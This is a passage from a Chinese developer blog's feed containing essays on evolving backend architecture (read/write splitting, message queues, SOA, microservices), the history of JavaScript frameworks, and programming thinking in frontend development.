class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h2><p>时间很快过去了半年，Neo的公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，这个时候Neo发现即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p><p>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离。</p><p>这里我又忍不住使用一个美食城的例子来说明数据库读写分离的思想了。</p><p>上文中我们提到数据的集中处理，一开始这样是挺有效的，但是随着用户的增多，负责处理数据的服务器还是忙不过来。同样的例子对于现实生活，很多美食城这类流量更大的场景，出现了另一种运作方式，美食城一般由管理公司和各个商户构成。消费者需要首先到管理公司设置的充值点充值，然后到各个商户刷卡消费，结账的人员只需要写入充值数据，然后每个商户都能读取数据。</p><p>因为数据的读取需要耗费大量的计算资源，而又不需要对数据进行修改操作，我们可以考虑把数据库的读和写这两种操作拆开。<br><img src="/thinking/thinking/roamap-of-system/2175500268.png" alt="image2.png"></p><p>我们可以使用数据库的主从架构来增加读的服务器，主数据库保证数据的一致性，使用从服务分担查询请求，主服务器会把数据同步到从服务器中实现数据的最终一致性。当然这个架构可以还是会遇到性能瓶颈，不过可以暂时用上很长一段时间了。</p><p>当然如果配上缓存，静态文件分离，性能会得到进一步提升。一般的项目到达这一步足以应对大多数的需求。</p><p><img src="/thinking/thinking/roamap-of-system/3545956801.png" alt="image3.png"></p><p>不过随后的日子里，产品经理提出需要给食材订购的页面中提供视频介绍，于是系统中出现了大量耗费计算资源或者耗时的视频转码操作。</p><h2 id="使用消息队列的架构"><a href="#使用消息队列的架构" class="headerlink" title="使用消息队列的架构"></a>使用消息队列的架构</h2><p>电影《让子弹飞》中有一句经典的台词，“让子弹飞一会儿”。程序世界和现实生活总是相似的，如果我们要去邮局寄出一封邮件，或者是到快递公司寄出一件包裹，我们不必等待邮件或者包裹到达了收件人手上我们才离开，这可得花好几天。</p><p>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。<br><img src="/thinking/thinking/roamap-of-system/3420216262.png" alt="image4.png"></p><p>对于这种应用场景，我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。</p><p>前面说的系统架构，应用服务器只是被克隆多个然后分别部署不同的，每一台应用服务器上的代码都是一模一样。就像原始生物真菌，细胞没有分化所有的细胞都具有同样的功能，从这一节起，不同应用服务器承担的职责开始变化，就像植物的出现让细胞开始分化。</p><p>随着业务的发展，Neo的公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p><h2 id="面向服务的架构（SOA）"><a href="#面向服务的架构（SOA）" class="headerlink" title="面向服务的架构（SOA）"></a>面向服务的架构（SOA）</h2><p>如果大家看过动漫《工作细胞》，一定会对萌萌哒的血小板妹妹印象深刻，《工作细胞》通过动漫拟人的方式讲述了人体中不同细胞的职责和工作方式。每种细胞都有自己独特的功能，血小板负责止血和修复创伤，而T细胞负责吞噬异物和发现入侵者。</p><p>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p><p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p><p><img src="http://www.printf.cn/usr/uploads/2019/01/1182979477.png" alt="image5.png"></p><p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p><p><img src="/thinking/thinking/roamap-of-system/3916462437.png" alt="image6.png"></p><p>服务调用有很多种方式，根据不同的网络协议使用RPC框架或者直接使用HTTP请求。</p><p>Neo的公司通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p><h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>随着Neo的公司急速发展，越来越多的业务需求被加入到系统中，系统已经变得极为庞大。 不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p><p>微服务大家都知道来自于Martin Fowler所创造并随之流行起来的概念。上面说的各种架构，应用之间依然强关联到一起，即使被拆分出来也是作为系统组件看待的，很难独立运行。</p><p>微服务的设计目的是为了让大型软件系统解耦。将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p><p>曾经和同事开玩笑，微服务做的最好的是一个国家的政府。相信所有人都去过政务中心，当你需要办理一个户口或者其他市政业务时，政务大厅运转的像极了一个软件系统。</p><p>大厅的签到处就像一个API gateway，帮你排号的同时需要你的身份证（认证），如果发现你不符合这个地区的办理条件（授权或scope），会直接拒绝你。在给多个人排号的时候会分配到不同的窗口，这时候你感觉面对的不是前台的小姐姐而是一台轮询策略的负载均衡服务器。有些业务，受理业务的窗口并不会真的处理，而是提交到专门处理的部门，窗口对你来说就是BFF（Backend for Frontend）。真正受理业务的部门处理完成后会把资料递交到档案室，如同数据库的读写一般。系统中某个部门因故暂停了工作，会帖出告示（熔断）。当然这样的例子太多太多，不再赘述。</p><p><img src="/thinking/thinking/roamap-of-system/3070633773.png" alt="image7.png"></p><p>微服务甚至不是一个架构，而是像一个生态，应用与应用之间互相独立，却又彼此依赖。通过DDD的模型来设计一个地图，把合适的代码放到合适的地方去。实现微服务涉及的工具太多，其中我省略了部分，以求让架构看起来更加清晰。</p><h2 id="架构的迷思"><a href="#架构的迷思" class="headerlink" title="架构的迷思"></a>架构的迷思</h2><p>原支付宝架构师周爱民老师曾说，“真正的架构师没有title”。然而更甚一步，其实IT系统的架构也没有title，每个公司的架构都是唯一的、混合的、适合业务需要的，很难说我们目前的架构就是标准的“微服务”，一个“标准的微服务”有时候可能对一线开发的小伙伴会很难受。</p><p>架构也很难一开始就设计的完美，架构不是设计出来的，甚至不能被设计，只能在需求的变化中不断演进。架构师的工作不太像建筑师那样构建大的蓝图，更像药剂师那样对症治病、照方抓药。就像《大教堂与集市》说的那样，“软件很大程度上是一个服务行业，虽然长期以来都毫无根据地被错认为是制造行业。”</p><p>就像生命在自然环境中不断适应，才得以演化；我们的架构需要根据需求中不断改进，才得以敏捷。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>从JavaScript框架的演变思考前端开发</title>
      <link href="/thinking/thinking/roamap-of-frontend/"/>
      <url>/thinking/thinking/roamap-of-frontend/</url>
      
        <content type="html"><![CDATA[<p>JavaScript框架的发展是一个不断带给人们惊喜的过程。JavaScript一度被认为只能做出网页上飞来飞去、令人讨厌的广告动画，到jQuery的出现人们开始用jQuery插件实现更为丰富的控件。再到后来的MVC、MVVM模式、Flux模式，让前端从制作网页变成运行在浏览器中的“应用程序”。</p><p>在不长的软件工程历史中，框架或者库影响了一门语言的思想，甚至人们因为框架改变了一门语言的的看法的的例子比比皆是，而JavaScript就是其中的代表。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2067297770.jpg" alt="js-frameworks.jpg"></p><p>思考JavaScript框架和库发展过程中的一些重要时期，对我们更好的理解前端开发或许有一些帮助。鉴于此，本篇对JavaScript发展过程中那些有深远意义的框架和库进行梳理，即使它们在历史的演变中被人们遗忘，它们的设计思想我相信也会让人受益。</p><h2 id="框架之前"><a href="#框架之前" class="headerlink" title="框架之前"></a>框架之前</h2><p>web前端的发展实在是迅猛，距离我大学时期也不过6-7年，那个时候的网页设计课还在使用“网页三剑客”。老师教我们使用Dreamweaver制作网页，Dreamweaver是一个类似于Word的可视化网页设计工具，使用了表格布局和行内样式，大部分是用来制作静态网页。</p><p>网页设计的高级内容就是制作JavaScript特效，制作类似文字随着鼠标浮动的特效，能独立制作一个轮播图组件已经算是厉害的角了。</p><p>在CSS3出现之前，网页设计中使用了各种“奇技淫巧”，JavaScript最大的作用就是实现一些页面特效（例如动画）。</p><p><img src="/thinking/thinking/roamap-of-frontend/2549450378.gif" alt="js.gif"></p><p>在前端开发框架变得流行之前，开发者的主要目的是完成各种前端特效，也会使用Ajax从后端返回HTML片段实现简单的动态内容加载。因此大量的DOM操作就不可避免了，为了简化DOM操作，出现了jQuery这类工具库。</p><h2 id="DOM操作时期"><a href="#DOM操作时期" class="headerlink" title="DOM操作时期"></a>DOM操作时期</h2><p>实际上在jQuery之前已经出现了一些非常成熟的JavaScript库，如Prototypejs、Mootools以及Dojo等。（在JavaScript中有时候库和框架的界限并不明显）jQuery的大量灵感来源于Prototypejs，下面简单说下Prototypejs。</p><p>Prototypejs正如其名，通过JavaScript原型链的机制实现了继承、接口等面向对象的操作。也提供了简单的DOM选择器、Ajax工具、JSON数据操作和事件代理。某种意义来说，Prototyojs已经是一个专业的前端开发框架了，但就当时来说它的缺点也很明显：当是很多网页制作者并不是专业的程序员，Prototypejs的API过于复杂，面向对象机制太难理解，选择器也不够强大。</p><p>jQuery简化了一些操作，并提供更为人性化的API，最重要的是开创性的使用了构造器模式实现了链式调用，并且将大量方法提供到jQuery的DOM包装对象上，为jQuery插件的编写提供了更大的空间。</p><p>Prototyojs 的操作DOM并注册事件</p><p><img src="/thinking/thinking/roamap-of-frontend/2195732725.png" alt="image.png"></p><p>jQuery操作的方式</p><p><img src="http://www.printf.cn/usr/uploads/2019/01/3638579191.png" alt="image2.png"><br>(在jQuery作者John Resig博客上建议的一个例子)</p><p>jQuery不仅更为容易使用，在内功的修炼上也是出类拔萃。操作DOM的第一步是从DOM树中找到目标DOM对象，如果大量使用id来获取DOM节点，这会让代码变得难以维护。jQuery提供了一个强大的选择器引擎，能通过元素标签名、类名、属性等各种能想到的方式获取DOM元素，并注册jQuery拓展的方法。jQuery内置的选择器引擎被剥离出来，现在名叫sizzlejs，和jQuery同属于JS基金会。对于前端开发者来说，jQuery非常值得一读，开场的自执行函数非常惊艳。</p><p>于是jQuery凭借容易使用的DOM操作API、强大的选择器和插件机制普及开来，并深深的影响了JavaScript这门语言。Prototypejs是一款被低估的框架，但并不是因为技术落后被代替的，它的模块化和架构性甚至比jQuery更好，在后面要介绍的Backbone中也能找到它的影子。</p><h2 id="富前端的思考"><a href="#富前端的思考" class="headerlink" title="富前端的思考"></a>富前端的思考</h2><p>前端开发最大的特点是基于页面的开发，在浏览器中用户载入一个页面，即使有丰富的交互和特效，在离开页面的时候，网页的运行环境就被重置了。这种开发模式的好处相对于桌面和移动APP开发更为简单，页面不需要维护整个应用程序的状态和数据，但是对于用户来说体验上有巨大差别。</p><p>人们不断思考，能不能把桌面和移动APP的体验带到浏览器上呢？用户打开一个网页就像启动了一个应用程序，无需页面重新加载就可以完成所有的操作，用户当前的操作无需被页面加载打断。</p><p>事实上各种各样的网站尝试类似的做法，不过直到Gmail 的出现让这个想法变得更为现实。使用Gmail的时候，邮件列表和编辑邮件等操作无需重新加载网页，而像普通的邮件客户端一样，只不过这一切发生在浏览器中。</p><p>大家可以对比Gmail 和 QQ邮箱，你会发现体验截然不同，QQ邮箱在进行各项操作时会发生页面跳转，Gmail可以在同一个页面完成所有操作。</p><h2 id="早期的富前端开发"><a href="#早期的富前端开发" class="headerlink" title="早期的富前端开发"></a>早期的富前端开发</h2><p>当DOM操作和Ajax技术变得愈来愈成熟的时候，人们不仅仅满足于制作静态页面和特效了，前端开发开始慢慢地往复杂交互和类似于桌面应用的方向发展。</p><p>使用Ajax带来了全新的用户体验，用户不必刷新整个页面，就可以动态的加载HTML片段或者JSON。大量的项目开始用局部刷新来提高用户体验，比较明显的例子就是QQ空间。</p><p>同时随着jQuery的不断流行，业界出现了一大批优秀的jQuery插件，例如模态框、下拉菜单、表格、文件上传等。</p><p><img src="http://www.printf.cn/usr/uploads/2019/01/3191252684.png" alt="image3.png"></p><p>伴随着jQuery和jQuery插件生态的成熟，Twitter推出的一个基于jQuery和jQuery插件的前端开发的开源工具包 Bootstrap，Bootstrap几乎成为了事实上HTML和CSS代码编写的规范。Bootstrap不仅提供了基础的CSS样式库，还通过jQuery插件的形式，提供了后台系统常用的组件。</p><p>至此前端开发进入了一个比较成熟的阶段，Bootstrap这类大而全的的前端开发框架出现，让类似表单提交等后端的逻辑演化到了前端。但是，Bootstrap依然是网页开发的模式，服务器动态脚本来加载页面和一部分数据。能不能让所有的逻辑都放到前端来，然后使用ajax和服务器统一通信呢？</p><p>此时业界还有另外一个前端框架在发展，它提供了及其丰富的控件，允许开发者通过JavaScript在前端完成几乎所交互，最后通过ajax把这些数据传回服务器。这样的框架能实现类似于桌面上的交互能力，它就是ExtJS，一款致力于构建富客户端的Ajax应用的前端框架。</p><p><img src="/thinking/thinking/roamap-of-frontend/1703820083.png" alt="image4.png"></p><p>不过Bootstrap和Extjs都有他们的局限性。</p><p>Bootstrap依赖jQuery和jQuery插件，其本质思想还是针对页面的DOM进行操作，当页面上存在很多数据和状态时，会显得非常吃力。并且基于多page原因，前端代码会被碎片化分割到不同的页面，没有统一的入口，使用jQuery的业务代码往往会被“意大利面式的代码”。</p><p>Extjs 因为过多特性和过强约束，让富客户端变得很容易，但这又让它的适用性变得很窄，往往适合大型的WEB行业软件或后台管理系统，例如经销存或者CRM系统。随着互联网发展，人们对交互和体验有了更多的个性化要求，Extjs也不太适合互联网公司的开发模式。</p><h2 id="MVC初现"><a href="#MVC初现" class="headerlink" title="MVC初现"></a>MVC初现</h2><p>随着浏览器性能的提升和各种JavaScript框架、库的发展，限制网页变成应用的瓶颈变成了如何管理数据和合理的架构。</p><p>jQuery只是一个DOM操作库，没有数据和状态管理组件。即使提供了$.data 方法，允许开发者将数据绑定到到DOM的属性上，但总归不是一个成熟的想法。</p><p>不过好在服务器编程领域已经思考过一遍类似的问题了，服务器编程经历了多入口多页面开发到业务逻辑分层的架构，最终发展成较为成熟的MVC架构。前端也出现了类似MVC架构的框架，Backbone是其中设计上比较优雅和简单的框架，Emberjs则是其中大而全和功能丰富的代表。<br><img src="http://www.printf.cn/usr/uploads/2019/01/1747858015.png" alt="image5.png"></p><p>如果还没有了解过MVC模式，可以参考阅读<a href="https://en.wikipedia.org/wiki/Model–view–controller" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller</a></p><p>但是在前端的MVC框架实现上毕竟只是参考了服务器端的设计思想，毕竟语言和运行环境的不同，实现上有一些不同，这里以Backbone为例指出这些不同。</p><ul><li>在前端的C（controller）往往被路由和数据集合代替，在Backbone中C指的是Collection</li><li>在服务器端V（View）非常好理解，就是输入/输入，但是前端的输入是通过处理用户交互事件获得的，数据的输出是通过HTML模板。（这部分比较复杂，于是后面发展出了双向绑定、虚拟DOM）</li><li>前端开发最大的特点是大量的异步操作，因此MVC中数据的流动是异步的。虽然这两年随着Nodejs、Spring Flux的发展，后端也有同样的趋势。</li></ul><p>简单来说使用前端MVC框架的基本逻辑是：</p><p>路由渲染视图给用户，然后通过和用户交互收集用户输入的数据，写入模型中，然后通过模型和服务器API交互。</p><p>使用Backbone开发一个Todos的例子：<a href="http://backbonejs.org/examples/todos/index.html" target="_blank" rel="noopener">http://backbonejs.org/examples/todos/index.html</a></p><h2 id="双向绑定和MVVM模式"><a href="#双向绑定和MVVM模式" class="headerlink" title="双向绑定和MVVM模式"></a>双向绑定和MVVM模式</h2><p>在前端开发中，最繁琐的工作就是处理大量复杂的表单。一般的方法就是通过监听Submit事件统一收集数据，或者通过onchange事件实时的收集用户输入。</p><p>人们想象如果有什么方法能把用户界面上的元素和程序对象关联起来该多好啊，只需要改变相关对象的属性，即可得到用户的输入和更新界面上的显示。</p><p>好在，微软在WPF技术中提出了MVVM模式，实现了用户界面和程序对象的绑定和映射。WPF的出现大大提高了桌面应用的开发效率，如果从事过MFC（VC6.0 使用的这种框架，如果你对大学生活还有映像的话）框架开发的开发者应该能体会到这种巨大变化。<br><img src="/thinking/thinking/roamap-of-frontend/3111808421.png" alt="image6.png"></p><p>Google的angularjs给我们带来了浏览器环境中的双向绑定，虽然因为浏览器的某些限制，并不能带来和WPF媲美的体验，但是也属于前端领域的突破性进展了。PS：注意这里的angularjs指的事angularjs 1.x和目前的angular 不是完全相同。</p><p>Angularjs的一些特点：</p><ul><li>由于低版本浏览器中的JavaScript不支持对象属性的赋值、取值钩子（setter、getter），Angular为了实现使用了定时器循环的脏检查，这对低版本和移动端的性能造成影响。</li><li>Angularjs为了能收集用户输入，覆盖了window上一些特定的对象，造成一定的侵入性，在技术选型上需要特别注意。</li></ul><p><img src="/thinking/thinking/roamap-of-frontend/4129203808.png" alt="image7.png"></p><p>总的来说Angularjs带来了能在浏览器中类似WPF的开发体验，让富客户端的开发进了一大步，于是越来越多的桌面软件被迁移到web平台。</p><p><img src="/thinking/thinking/roamap-of-frontend/3044428455.gif" alt="ng.gif"></p><p>（视图根据数据实时改变）</p><p>除Angularjs 之外，MVVM还有Knockoutjs，在某种程度上Vue也算使用了MVVM模式。</p><h2 id="数据驱动视图和Flux模式"><a href="#数据驱动视图和Flux模式" class="headerlink" title="数据驱动视图和Flux模式"></a>数据驱动视图和Flux模式</h2><p>web开发者追求把桌面应用搬到浏览器中的同时，另一拨人也想把移动端APP搬到浏览器上。构建一个在APP webview中和浏览器上都能运行的APP是多么惬意的事情啊。</p><p>不过无论是jQuery到Angularjs在移动端都不好用，我曾经用Ionic(基于Angularjs的移动端前端框架)构建过应用，性能和数据管理能力（对于移动端而言）都不好。</p><p>Facebook 同样有此困扰，在移动端APP中需要管理一个全局的状态，进而渲染不同的视图。Facebook创建了通过虚拟DOM渲染视图的React，并使用Flux来驱动。虚拟DOM是指在JavaScript层面使用对象维护一个和浏览器DOM一致的数据结构，然后根据数据创建DOM节点，避免使用HTML模板。</p><p>使用虚拟DOM有几个好处：</p><ul><li>性能提升，每次数据更新更新对应DOM节点即可，不会大规模造成浏览器重排。</li><li>便于数据驱动，因为使用虚拟DOM，视图的渲染由数据结构决定，APP状态的变化可以反映到页面上。<br><img src="/thinking/thinking/roamap-of-frontend/1679957627.png" alt="image8.png"></li></ul><p>（Redux数据流，Store为APP全局状态）</p><p>为了配合React的使用，Facebook使用了Flux作为全局状态管理工具，当然社区使用Redux作为改进型被广泛使用。</p><p>使用状态驱动的APP一个最直观的体验就是用户可以自由的前进、后退，每个页面不会因为跳转销毁。因此最开发者而言也拥有了“时间旅行”这一炫酷的能力，即通过切换APP状态切换到APP不同时期的显示效果。这在移动端开发上很常见，但是在传统的MVC、MVVM上很难做到。</p><p>无论是Flux和Redux，相对于Angularjs的双向绑定，最显著的区别是数据变成了单向传递的，这就避免了双向绑定时局部状态和APP全局状态冲突的矛盾。</p><p>当然Vue生态下的Vuex让这类数据驱动的前端框架更为容易使用，不过在原理上大同小异，不再赘述。</p><h2 id="几个为什么"><a href="#几个为什么" class="headerlink" title="几个为什么"></a>几个为什么</h2><h3 id="为什么写这篇文章？"><a href="#为什么写这篇文章？" class="headerlink" title="为什么写这篇文章？"></a>为什么写这篇文章？</h3><p>思考前端技术选型。每种技术的出现都有特定的背景和解决的问题，如果理解这些框架出现背后的逻辑，对技术选型可以有很好的帮助。举个例子，目前主流的前端技术是React，但是像一些门户网站并不是单页应用，同时有大量的信息展示，这种情况可能jQuery更好用。选择合适的技术比选择流行的技术更为重要，我们不能一说前端开发就是React、VUE。</p><p>充分发挥框架的优势。使用一个框架首先需要理解它背后的设计理念，React和Redux可以很好地构建数据驱动的APP。不过如果使用了大量的refs去操作DOM，甚至大量使用jQuery，会对项目带来灾难性的影响。</p><h3 id="前后端分离在分离什么？"><a href="#前后端分离在分离什么？" class="headerlink" title="前后端分离在分离什么？"></a>前后端分离在分离什么？</h3><p>首先前后端分离的是数据和视图。我们用了React/Vue进行单页面开发，但是却从jsp/php/Aspx等服务器模板中获取数据，数据和视图耦合到一起，即使做足了前端工程实践，这也不是前端分离；由于某些原因，我们不得不多页面开发（例如webview的落地页）使用zepto从专门的API上获取数据并渲染视图，这一样是前后端分离的架构。</p><p>其次前后端分离不应该是工程师技术鸿沟。每个从事web开发的工程师都需要了解在HTTP协议两端的工作方式，前后端思想一直在不断融合和碰撞，只有对应用程序整体有一个很好的认识才能做出优秀的设计。</p><h3 id="为什么提倡数据驱动视图？"><a href="#为什么提倡数据驱动视图？" class="headerlink" title="为什么提倡数据驱动视图？"></a>为什么提倡数据驱动视图？</h3><p>技术服务于业务，在移动端的APP中很多交互需要全局状态管理和避免反复加载。我们想尽可能的让Web APP贴近原生APP，数据驱动可以带来更好地体验和更合理的开发逻辑。</p><h3 id="所有的数据都需要放到状态管理吗？"><a href="#所有的数据都需要放到状态管理吗？" class="headerlink" title="所有的数据都需要放到状态管理吗？"></a>所有的数据都需要放到状态管理吗？</h3><p>当我在开发React+Redux时，这是最让我头疼的一个问题。DOM像是一棵树，理想的情况下Redux的store数据能一一对应，不过有些视图需要每次进入都要更新，那么如果把这类一次性的数据放入状态管理中是一种负担。如果把路由下的数据比喻成这个树下面的枝丫的话，决定一个下拉菜单是否展开这种状态就是叶子，如果没有特别的需求需要记录这些状态，可以不必把所有的数据放到应用状态中。</p><h3 id="jQuery、Backbone、Angularjs等传统框架落后了吗？"><a href="#jQuery、Backbone、Angularjs等传统框架落后了吗？" class="headerlink" title="jQuery、Backbone、Angularjs等传统框架落后了吗？"></a>jQuery、Backbone、Angularjs等传统框架落后了吗？</h3><p>jQuery的选择器甚至被内置到浏览器中，Backbone和Angularjs 还有大量的场景需要用到这些框架，当然这些技术由于需求的演变可能用的会越来越少，但尚不能归到落后的类别中去。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端的编程思维</title>
      <link href="/thinking/thinking/thinking-in-frontend/"/>
      <url>/thinking/thinking/thinking-in-frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="从切图开始"><a href="#从切图开始" class="headerlink" title="从切图开始"></a>从切图开始</h2><p>在几周以前的一个周末去了趟上海，除了感受了魔都的快节奏生活之外，作为前端的面试官参加了上海分公司的面试Open Day活动。 </p><p>在Open Day，候选人一天就能拿到Offer，但是需要完成现场作业、结对编程等环节。我们的现场作业题目是模拟操作一个火星车方阵，根据输入的数据，程序来完成放置火星车、左右转、前进等场景。这个题目实现并不难，设计该题目的目的是为了考察候选人程序设计、代码风格和工程化的能力。 </p><p>很快，陆陆续续有一些候选人完成了现场作业，有的是在Node.js平台上完成，用变量模拟数据的输入，用面向对象的方式给火星车分配了实例，然后操作这些实例完成了任务。还有一些使用了JavaScript文件和一个简单的HTML文件加载到浏览器中运行。随着时间的过去，一个女生迟迟没有提交，时间到后，我上前检查，她编写一个HTML页面，然后使用JavaScript操作dom元素来了移动页面上的”火星车”，JavaScript脚本耦合在HTML文档中。这个女生告诉我她以为不能使用JQuery，于是使用原生JavaScript，因此遇到了很多问题以至于不能及时完成。结果可想而知。 </p><p>这件事给我的触动很大，也为这位候选人没能通过面试感到遗憾。其实我们期待的作业是一个可以正确运行的”程序”，无论是面向对象的设计还是函数式的设计，而这位候选人关注在”页面”，甚至HTML和JavaScript都没有分离，只有几个响应DOM事件的JavaScript函数。显然这位候选人对我们的题目理解并不一样，那么不同工程师之间的思维差异是怎样的呢。</p><p>我想到了 “编程思想”，我不算正经的科班生，但犹记得在读书期间像老师请教过关于编程的内容，老师提到最多的就是”编程思想”。在后面的前几年开发生涯中，也在不断思考这个问题，怎么样才能算具有开发思想，怎么去设计程序和组织代码才是最好的。貌似在做过不少项目，上线过很多应用后，也没有得到答案，甚至随着身边的人水平不断增高，这个问题不再被提起。 在前几年，前后端开发还没有分离时，当时的开发模式为前端编写页面、CSS和少量的JavaScript，随后由后端开发者来集成到项目中去。前端不仅备受歧视，并且因为交付产物不是完整的程序，甚至并不被当做”程序员”，业内黑话叫 “切页面的”。当时的行情是会使用jQuery或原生JS编写组件的很值钱，否则”页面仔”并不值钱。 </p><p><img src="/thinking/thinking/thinking-in-frontend/3528157878.jpg" alt="programming-thinking.jpg"></p><h2 id="怎么从前端找到编程思维？"><a href="#怎么从前端找到编程思维？" class="headerlink" title="怎么从前端找到编程思维？"></a>怎么从前端找到编程思维？</h2><p>前后端分离是一个非常好的契机，改变了前端的开发模式，前后端分离后的前端项目又叫做单页应用（SPA），这种应用不像传统的页面会发生跳转，页面的跳转由视图的切换代替。 </p><p><img src="/thinking/thinking/thinking-in-frontend/745085406.png" alt="image.png"></p><p>前后端分离后开发者需要理解的第一件事是：前端应用变成了一个运行在浏览器的完整的程序。JavaScript不再是完成页面上特效的小玩意儿了，需要承担起管理数据、处理用户相应和渲染页面的职责。最早带来这种革命的应用是Gmail, Gmail被认为是第一个富前端应用程序。随后Backbone把MVC思维带到了前端，AngularJS的双向绑定让富前端开发变得非常容易和简单，开启了富前端应用第一个高潮。 </p><p>前端开发是做一个完整的应用程序的例子是一个代办记事列表应用，这也是前端开发框架往往使用的的经典案例，不亚于Hello world。</p><p>马上体验：<a href="http://todomvc.com" target="_blank" rel="noopener">http://todomvc.com</a></p><h2 id="程序是什么？"><a href="#程序是什么？" class="headerlink" title="程序是什么？"></a>程序是什么？</h2><p>我们说要具有编程思维，那我们先说说程序是什么，百科的说法是： </p><p>计算机程序又称“计算机软件”，通过指令的顺序，使计算机能按所要求的功能进行精确记述的逻辑方法。 </p><p>这个定义需要首先理解计算机是什么，然而我们不用想的这么复杂。通俗来说，计算机就像一个听话而行事准确的奴隶，人类只需要给出确切的命令和输入就可以干活，否则就会报错。 前端应用程序和服务器、桌面程序的差异在于他们的运行环境不同。桌面程序可以随意调用系统API，实现几乎所有的功能；服务器程序没有界面，就像《黑客帝国》中被关起来的锁匠一样，暗无天日的解决问题即可；前端应用寄宿在浏览器这个容器中，就像银行柜员一样响应用的需求，传递给后台。 </p><p>传统程序把数据和页面混合后发送给浏览器，现代的前端应用是把页面和JavaScript发送给浏览器，然后前端接了一个小水管（API）获取数据，然后前端自己加工渲染到页面。于是web前端应用程序越来越像真正的客户端应用了。 </p><h2 id="建立前端的APP的编程思想"><a href="#建立前端的APP的编程思想" class="headerlink" title="建立前端的APP的编程思想"></a>建立前端的APP的编程思想</h2><p>有一道经典的前端面试题是考察浏览器载入页面时的加载顺序，从这个角度出发，页面的加载到用户关闭窗口，就类似于桌面客户端启动和退出。 因为传统的的页面，从加载渲染到用户关闭这个窗口只用了很短的时间，窗口随即被销毁，就像一个一次性的用品，浏览器和HTTP协议帮我们管理了很多东西，因此我们不比考虑数据的管理、内存的分配、代码的组织。 </p><p>当我们的从多页面开发转向到单页应用时，这些问题就不得不重新思考： </p><p><em>APP的生命周期</em> 在多页面开发时，数据和HTML混合后和css、JavaScript片段被发送到浏览器，HTML和CSS被渲染后JavaScript需要做的只是注册事件，大部分事情都是服务器和浏览器来完成的，JavaScript起到的作用并不是特别大。这种方式造成了用户操作时反复请求、加载、渲染，用户会受到白屏、等待和操作不流畅等糟糕体验。在单页应用时代，HTML\css\js被作为入口打包后发送给浏览器，然后使用JavaScript像普通客户端程序一样启动，开始拉取数据、构建页面、绑定事件后对用户做出响应，用户发生操作再进行拉取数据、重新渲染，页面之间使用DOM视图切换完成，最终用户退出该页面后数据被释放。 </p><p><em>数据管理和垃圾回收</em> 前后端分离的本质是HTML/CSS/JS组成的应用程序和数据进行分离，HTML/CSS/JS从web容器中加载，数据从API加载，数据的处理需要JavaScript来完成，这也是为什么最早的MVC框架Backbone强制依赖了集合数据处理库underscore，在React的生态中很多开发者喜欢使用loadash。多页面开发时，页面切换或刷新后，数据和事件会被重置，但现在需要自己管理，直到用户退出前，程序持续运行，因此需要特别考虑一些数据的释放、变量引用指针是否正确、事件是否被重复绑定等问题。 </p><p><em>组织代码</em> 在之前，JavaScript只是被当做浏览器的一个简单脚本。几乎没有代码结构而言，大量的行内的代码，好一点的放置到页面底部，或者使用外部JavaScript文件。慢慢的发展出一堆函数和方法集合的库，然后有一些面向对象的实践。因为页面加载一次后就被释放，JavaScript往往是小量的，并且通常每个页面之间用到的独立JavaScript片段构成。单页应用中，应用程序被作为一个整体加载，程序运行的逻辑发生了不小的变化： </p><ol><li>程序应该使用统一的入口来初始化整个应用 </li><li>对各个功能组件进行拆分。拆分是为了更好的组合，只有良好的解耦才能最大化的重新组合各个组件 </li><li>学习面向对象思想。面向对象可以让组件职责更加清晰 </li><li>数据和视图拆分，使用数据驱动视图 </li><li><p>了解设计模式。设计模式是组织大型应用程序代码的”套路”，可以自己设计好良好的代码，也可以参考现成的模式。例如当我第一次看到Redux的dispatch实现时，脑子第一想法是这玩意儿和Window上的MFC消息机制非常像。 